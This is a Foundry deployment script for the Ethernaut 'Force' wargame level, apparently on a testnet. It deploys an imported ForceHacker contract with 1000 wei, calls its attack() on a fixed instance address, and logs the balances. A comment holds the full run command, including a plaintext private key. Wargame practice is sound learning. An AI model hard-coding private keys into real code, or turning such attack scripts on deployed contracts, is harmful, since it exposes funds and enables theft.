// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "../src/Ethernaut/Force/ForceHacker.sol";
import "forge-std/console.sol";

//Execute
//forge script script/Force.s.sol:ForceScript --rpc-url 'https://rpc.ankr.com/eth_rinkeby' --broadcast --private-key 'bbcdcf6c876839be76f70d4d2cecc1595c99dcb4bcdc9c964705f8c7a2d9ad16' --verify --etherscan-api-key
   
contract ForceScript is Script {
    function setUp() public {}

    function run() public {

        console.log(msg.sender);
        console.log("####1");
        vm.startBroadcast();
        console.log(msg.sender);

        console.log("####2");
        ForceHacker force = new ForceHacker{value: 1000 wei}(0x087e02477E45067F8C5428f2550Ae6A988E4848D);
        console.log(address(this));
        console.log(force.owner());
        
        console.log("####3");
        console.log(address(0x087e02477E45067F8C5428f2550Ae6A988E4848D).balance);
        force.attack();
        console.log(address(0x087e02477E45067F8C5428f2550Ae6A988E4848D).balance);
        
        console.log("####4");
        vm.stopBroadcast();
        
        console.log("####5");

    }
}
